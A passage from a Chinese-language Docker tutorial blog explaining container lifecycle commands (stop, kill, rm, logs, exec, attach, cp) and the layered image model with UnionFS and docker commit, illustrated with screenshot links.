class="line">![image-20200507190129849](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190129849.png)</span><br><span class="line"></span><br><span class="line">##### docker restart	重启容器</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker restart 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507190715336](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190715336.png)</span><br><span class="line"></span><br><span class="line">##### docker stop	停止容器</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker stop 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507191101140](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191101140.png)</span><br><span class="line"></span><br><span class="line">##### docker kill	强制关闭</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker kill 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507191633590](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191633590.png)</span><br><span class="line"></span><br><span class="line">##### docker rm	删除容器</span><br><span class="line"></span><br><span class="line">格式</span><br><span class="line"></span><br><span class="line">&#96;docker rm 容器ID&#96;如果现实在运行中加&#96;-f&#96;参数强制删除，如：&#96;docker rm -f 容器ID&#96;</span><br><span class="line"></span><br><span class="line">##### 注意：docker rm(没有i)是删除容器。docker rmi(有i)是删除镜像。一定要区分</span><br><span class="line"></span><br><span class="line">![image-20200507192219692](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507192219692.png)</span><br><span class="line"></span><br><span class="line">##### docker rm $(docker ps -aq) </span><br><span class="line"></span><br><span class="line">##### docker ps -aq | xargs docker rm</span><br></pre></td></tr></table></figure>
<p>// 查找所有运行和停止的容器，然后将这些信息传递到xargs然后docker rm 进行删除<br>docker ps -aq | xargs docker rm</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这两个都是 一次性删除多个容器</span><br><span class="line"></span><br><span class="line">其中第二个中的&#96;xargs&#96;命令的作用，是将标准输入转为命令行参数。</span><br></pre></td></tr></table></figure>
<p>例如：<br>    $ echo “hello world” | xargs echo<br>含义：将管道左侧的标准输入，转为命令行参数hello world，传给第二个echo命令。<br>也就是，上一个命令的结果集作为输入参数传给管道后的下一个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### docker run -d 容器名</span><br><span class="line"></span><br><span class="line">后台运行容器，并返回容器的ID</span><br><span class="line"></span><br><span class="line">![image-20200507211155631](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507211155631.png)</span><br><span class="line"></span><br><span class="line">使用镜像centos：latest以后台模式启动一个容器</span><br><span class="line"></span><br><span class="line">&#96;docker run -d centos&#96;</span><br><span class="line"></span><br><span class="line">问题：使用&#96;docker ps -a&#96;进行查看，会发现容器已经退出</span><br><span class="line"></span><br><span class="line">很重要的要说明的一点：**Docker容器宏图爱运行，就必须有一个前台进程。**</span><br><span class="line"></span><br><span class="line">容器运行的命令如果不是那些**一直挂起的命令（比如运行top、tail）**，就会自动退出的。</span><br><span class="line"></span><br><span class="line">这个是docker的机制问题，比如你的web容器，我们以nginx为例，正常情况下，我们配置启动服务只需要启动相应的service即可。即可。</span><br><span class="line"></span><br><span class="line">例如：service nginx start</span><br><span class="line"></span><br><span class="line">但是，这样做nginx为后台进程模式运行，就导致docker前台没有运行的应用。</span><br><span class="line"></span><br><span class="line">这样的容器后台启动后，会立即自杀因为他觉得他没事可做了，所以，最佳的解决方案的是，将你要运行的程序以前台进程的形式运行</span><br><span class="line"></span><br><span class="line">**说白了前台启动用&#96;-it&#96;会返回给你一个自身容器的id编号的终端。 使用&#96;-d&#96;以后台模式启动容器**</span><br><span class="line"></span><br><span class="line">##### &#96;docker logs -f -t --tail 容器ID&#96;	查看容器日志</span><br><span class="line"></span><br><span class="line">- -t：是加入时间戳</span><br><span class="line">- -f：跟随最新的日志打印</span><br><span class="line">- --tail [数字]：显示最后多少条</span><br><span class="line">- -tf：显示全部日志</span><br></pre></td></tr></table></figure>
<p>// docker run -d centos以后台的形式运行centos<br>// /bin/sh -c “while true;do echo hello world;循环的打印hello world<br>// sleep 2;done”每2秒打印这句话因为while是true死循环一直循环<br>说白了就是我要把这个输出打印到控制台上，这样就会导致前台有响应，这样后台启动的话docker也不会自我关闭<br>docker run -d centos /bin/sh -c “while true;do echo hello world;sleep 2;done”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">运行一下试试，先试用&#96;docker ps&#96;查看当前是否有运行的容器</span><br><span class="line"></span><br><span class="line">![image-20200508205354753](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205354753.png)</span><br><span class="line"></span><br><span class="line">运行上面的Linux Shell编程，然后再使用docker ps查看结果</span><br><span class="line"></span><br><span class="line">&#96;docker run -d centos &#x2F;bin&#x2F;sh -c &quot;while true;do echo hello world;sleep 2;done&quot;&#96;</span><br><span class="line"></span><br><span class="line">状态返回了UP，说明运行成功</span><br><span class="line"></span><br><span class="line">![image-20200508205512712](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508205512712.png)</span><br><span class="line"></span><br><span class="line">虽然后台启动了，但不想有一个交互窗口，还是想在自己的宿主机，但是不能表示程序不能在后台安静的运行。</span><br><span class="line"></span><br><span class="line">此时就要看看&#96;docker logs 容器ID&#96;的日志，每隔两秒钟打印一个hello world后台有个程序跑着</span><br><span class="line"></span><br><span class="line">![image-20200508210007228](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508210007228.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker logs -tf 容器ID&#96;将时间戳打印，不停地追加(更新日志)。</span><br><span class="line"></span><br><span class="line">![image-20200508211210344](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211210344.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用&#96;docker logs -tf --tail 3 容器ID&#96;将时间戳打印，不停地追加(更新日志)，并且只显示最后三条(--taile后面跟了数字3)，但是因为加了-f所以一直在追加。</span><br><span class="line"></span><br><span class="line">![image-20200508211149440](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211149440.png)</span><br><span class="line"></span><br><span class="line">##### top	查看容器内运行的进程</span><br><span class="line"></span><br><span class="line">&#96;top&#96;命令式查看linux的进行，而查看docker容器的进程就使用&#96;docker top 容器ID&#96;</span><br><span class="line"></span><br><span class="line">为什么docker可以使用&#96;top&#96;，因为可以将docker看做是一个简易版的linux环境</span><br><span class="line"></span><br><span class="line">![image-20200508211740262](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508211740262.png)</span><br><span class="line"></span><br><span class="line">##### docker inspect	查看容器内部细节</span><br><span class="line"></span><br><span class="line">docker镜像是一层套一层就像一个同心圆一样，所以说&#96;inspect&#96;查看容器内部细节，意思就是描述整个容器，以一个阶层串的形式嵌套的形式描述</span><br><span class="line"></span><br><span class="line">告诉你容器全部的结构细节</span><br><span class="line"></span><br><span class="line">&#96;docker inspect 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200508221907314](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508221907314.png)</span><br><span class="line"></span><br><span class="line">这个就是输出打印的内容</span><br><span class="line"></span><br><span class="line">![image-20200508222052594](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508222052594.png)</span><br><span class="line"></span><br><span class="line">只是整个id中的前几位</span><br><span class="line"></span><br><span class="line">![image-20200707193523775](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707193523775.png)</span><br><span class="line"></span><br><span class="line">##### docker exec -it 容器ID &#x2F;bin&#x2F;bash	进入正在运行的容器并以命令行交互</span><br><span class="line"></span><br><span class="line">&#96;docker exec -it 容器ID &#x2F;bin&#x2F;bash&#96;</span><br><span class="line"></span><br><span class="line">重新进入&#96;docker attach 容器ID&#96;</span><br><span class="line"></span><br><span class="line">&#96;docker attach&#96;例：</span><br><span class="line"></span><br><span class="line">① 先使用&#96;docker run -it centos&#96;以交互模式创建一个伪终端(centos)</span><br><span class="line"></span><br><span class="line">② 再&#96;ctrl+p+q&#96;切换到宿主机</span><br><span class="line"></span><br><span class="line">③ 使用&#96;docker attach 容器ID&#96;重新进入这个容器</span><br><span class="line"></span><br><span class="line">![image-20200508235922305](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200508235922305.png)</span><br><span class="line"></span><br><span class="line">&#96;docker exec -it 容器ID bashShell&#96;例：</span><br><span class="line"></span><br><span class="line">使用这个命令直接在宿主机就可以使用centos中&#96;ls -l&#96;命令查看tmp文件下的内容，而本身并没有进入容器中</span><br><span class="line"></span><br><span class="line">![image-20200509000527519](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000527519.png)</span><br><span class="line"></span><br><span class="line">而&#96;docker exec&#96;可以和&#96;attach&#96;一样进入容器，它的功能比&#96;attach&#96;强大。</span><br><span class="line"></span><br><span class="line">①  可以不进入容器直接在宿主机使用&#96;docker exec&#96;进行centos命令的使用。</span><br><span class="line"></span><br><span class="line">② 也可以和&#96;docker attach&#96;一样进入容器</span><br></pre></td></tr></table></figure>
<p>docker exec     # 进入容器后开启一个新的终端，可以在里面操作（常用）<br>docker attach    # 进入容器 正在执行的终端，不会启动新的进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image-20200509000851503](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509000851503.png)</span><br><span class="line"></span><br><span class="line">##### docker cp 容器ID:容器内路径 目的主机路径		从容器内拷贝文件到主机上</span><br><span class="line"></span><br><span class="line">&#96;docker cp 容器ID:容器内路径 目的主机路径&#96;</span><br><span class="line"></span><br><span class="line">现在容器的tmp文件下新建一个111.txt文件夹，内容This is a my first code</span><br><span class="line"></span><br><span class="line">![image-20200509002902272](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509002902272.png)</span><br><span class="line"></span><br><span class="line">切换回宿主机，查看当前root下是否有111.txt，其中并没有111.txt</span><br><span class="line"></span><br><span class="line">![image-20200509003001581](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003001581.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker cp 容器ID:路径 宿主机路径&#96;，然后使用&#96;ll&#96;查看当前路径下是否成功复制了111.txt并查看其内容。</span><br><span class="line"></span><br><span class="line">这样就成功将docker容器中的111.txt成功复制到宿主机上了</span><br><span class="line"></span><br><span class="line">![image-20200509003121627](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509003121627.png)</span><br><span class="line"></span><br><span class="line">#### docker镜像</span><br><span class="line"></span><br><span class="line">docker镜像是什么？</span><br><span class="line"></span><br><span class="line">镜像是一种轻量级、可执行的独立软件包，**用来打包软件运行环境和基于运行环境开发的软件**，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</span><br><span class="line"></span><br><span class="line">- UnionFS（联合文件系统）</span><br><span class="line">- Docker镜像加载原理</span><br><span class="line">- 分层镜像</span><br><span class="line">- 为什么Docker镜像要采用这种分层结构</span><br><span class="line"></span><br><span class="line">如何得到镜像：</span><br><span class="line"></span><br><span class="line">- 从远程仓库下载</span><br><span class="line">- 朋友拷贝给你</span><br><span class="line">- 自己制作一个镜像DockerF ile</span><br><span class="line"></span><br><span class="line">##### UnionFS（联合文件系统）</span><br><span class="line"></span><br><span class="line">UnionFS（联合文件系统）：Union文件系统（UnionFS）是一种分层，轻量级并且高性能的文件系统，它支持**对文件系统的修改作为一次提交来一层一层的叠加**，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directiories into a single virtual file system）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</span><br><span class="line"></span><br><span class="line">特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</span><br><span class="line"></span><br><span class="line">##### Docker镜像加载原理</span><br><span class="line"></span><br><span class="line">docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</span><br><span class="line"></span><br><span class="line">botfs(boot file system)主要包含bootloader和kernel, botloader主要是引导加载kernel, Linux刚启动时会加载bootfs文件系统，**在Docker镜像的最底层是bootfs**。这- -层 与我们典型的Linux&#x2F;Unix系统是- -样的，包含boot加戟器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由botfs转交给内核，此时系统也会卸载botfs。</span><br><span class="line"></span><br><span class="line">rootfs (root file system)，在botfs之上.包含的就是典型Linux系统中的&#x2F;dev, &#x2F;proc, &#x2F;bin, &#x2F;etc 等标准目录和文件。roots就是各种不同的操作系统发行版，比如Ubuntu, Centos 等等。</span><br><span class="line"></span><br><span class="line">![image-20200509171839224](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171839224.png)</span><br><span class="line"></span><br><span class="line">平时我们安装进虚拟机的Centos都是好几个G，为什么docker这里才200M</span><br><span class="line"></span><br><span class="line">![image-20200509171940133](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509171940133.png)</span><br><span class="line"></span><br><span class="line">##### 分层的镜像</span><br><span class="line"></span><br><span class="line">对于一个精简的OS，rootfs可以很小，只需要包括最基本的命令、工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供rootfs就行了。由此可见对于不同的linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。</span><br><span class="line"></span><br><span class="line">##### 为什么Docker镜像要采用这种分层结构呢</span><br><span class="line"></span><br><span class="line">最大的一个好处就是-共享资源</span><br><span class="line"></span><br><span class="line">比如：有多个镜像都从相同的base镜像构建而来，那么宿主机只需要在磁盘上保存一份base镜像，同时内存中只需加载一份base镜像，就可以为所有容器服务了，而且镜像的每一层都可以共享。</span><br><span class="line"></span><br><span class="line">![image-20200509174120126](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509174120126.png)</span><br><span class="line"></span><br><span class="line">##### 理解：</span><br><span class="line"></span><br><span class="line">所有的Docker镜像都起始于一个基础镜像层 。当进行修改或增加新的内容时。就会在当前镜像层之上,创建新的镜像层。举一个简单的例子,假如基于Ubuntu Linux 16.04创建一个新的境像 ,这就是新镜像的第-层;如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层;如果继续添加一个安全补丁,就会创建第三个镜像层。该镜像当前已经包含3个镜像层,如下图所示(这只是一个用于演示的很简单的例子).</span><br><span class="line"></span><br><span class="line">![image-20200709101536512](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101536512.png)</span><br><span class="line"></span><br><span class="line">在添加额外的境像屈的同时。镜像始终保持是当前所有镜像的组合。理解这一点非常重要。 下图中举了-个简单的例子,每个镜像层包含3个文件。而镜像包含了来自两个镜像层的6个文件。</span><br><span class="line"></span><br><span class="line">这两个镜像是没有冲突的，如果将它打包成镜像的时候，里面就会有六个文件，也就相当于有6层。</span><br><span class="line"></span><br><span class="line">![image-20200709101750617](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709101750617.png)</span><br><span class="line"></span><br><span class="line">上图中的镜像层跟之前图中的略有区别,主要目的是便于展示文件。</span><br><span class="line"></span><br><span class="line">下图中展示了一个稍微复杂的三层镜像。在外部看来整个镜像只有6个文件。这是因为最上层中的文件7是文件5的一个更新版本。所以文件7将文件5替换掉了，所以还是6层，这样就可以实现一些文件复用</span><br><span class="line"></span><br><span class="line">![image-20200709102140896](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102140896.png)</span><br><span class="line"></span><br><span class="line">这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为- -个新镜像层添加到镜像当中。</span><br><span class="line">Docker通过存储引擎(新版本采用快照机制)的方式来实现镜像层堆栈,并保证多镜像层对外展示为统-的文件系统。</span><br><span class="line">Linux.上可用的存储弓|擎有AUFS、Overlay2、 Device Mapper、Btrfs 以及ZFS。顾名思义,每种存储引擎都基于Linux中对应的</span><br><span class="line">文件系统或者块设备技术,诅每种存储引擎都有其独有的性能特点。</span><br><span class="line">Docker在Windows.上仅支持windowsfilter -种存储引擎,该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</span><br><span class="line">下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并,对外提供统-的视图。</span><br><span class="line"></span><br><span class="line">![image-20200709102529485](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709102529485.png)</span><br><span class="line"></span><br><span class="line">Docker镜像都是只读的,当容器启动时, -个新的可写层被加载到镜像的顶部!</span><br><span class="line"></span><br><span class="line">上面这句话的意思</span><br><span class="line"></span><br><span class="line">![image-20200709164201727](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164201727.png)</span><br><span class="line">这一层就是我们通常说的容器层,容器之下的都叫镜像层!</span><br><span class="line"></span><br><span class="line">![image-20200709164833283](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200709164833283.png)</span><br><span class="line"></span><br><span class="line">##### docker镜像特点</span><br><span class="line"></span><br><span class="line">docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层通常被称作“容器层”，“容器层”之下的都叫“镜像层”。</span><br><span class="line"></span><br><span class="line">##### Docker_镜像commit</span><br><span class="line"></span><br><span class="line">如果想要保存当前容器的状态，就可以通过commit来提交，获得一个镜像，可以看作为VM的快照功能</span><br><span class="line"></span><br><span class="line">docker_镜像commit操作:</span><br><span class="line"></span><br><span class="line">- docker commit 提交容器副本使之成为一个新的镜像</span><br><span class="line"></span><br><span class="line">  - &#96;docker run -it -p 8080:8080 tomcat&#96;</span><br><span class="line"></span><br><span class="line">    - -p 主机端口:docker容器端口</span><br><span class="line"></span><br><span class="line">    - -P 随机分配端口</span><br><span class="line"></span><br><span class="line">    - i：交互</span><br><span class="line">    - t：终端</span><br><span class="line"></span><br><span class="line">- docker commit -m&#x3D;&quot;提交的描述信息&quot;-a&#x3D;&quot;作者&quot;容器ID要创建的目标镜像名:[标签名]</span><br><span class="line"></span><br><span class="line">##### 案例演示</span><br><span class="line"></span><br><span class="line">- 从Hub上下载tomcat镜像到本地并成功运行</span><br><span class="line"></span><br><span class="line">  - &#96;docekr run -it -p 8080:8080 tomcat&#96;</span><br><span class="line"></span><br><span class="line">  - 使用&#96;docker ps&#96;查看端口，8888以为刚才这值得是8888当然这些端口都只是**映射端口**</span><br><span class="line"></span><br><span class="line">    - ![image-20200509211850828](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211850828.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509211823006](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509211823006.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509212302011](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212302011.png)</span><br><span class="line"></span><br><span class="line">    使用&#96;-P&#96;随机分配端口&#96;docker run -it -P tomcat&#96;端口号变成了32768</span><br><span class="line"></span><br><span class="line">    ![image-20200509212358609](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509212358609.png)</span><br><span class="line"></span><br><span class="line">    ![image-20200509214601158](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200509214601158.png)</span><br><span class="line"></span><br><span class="line">- 故意删除上一步镜像生产tomcat容器的文档</span><br><span 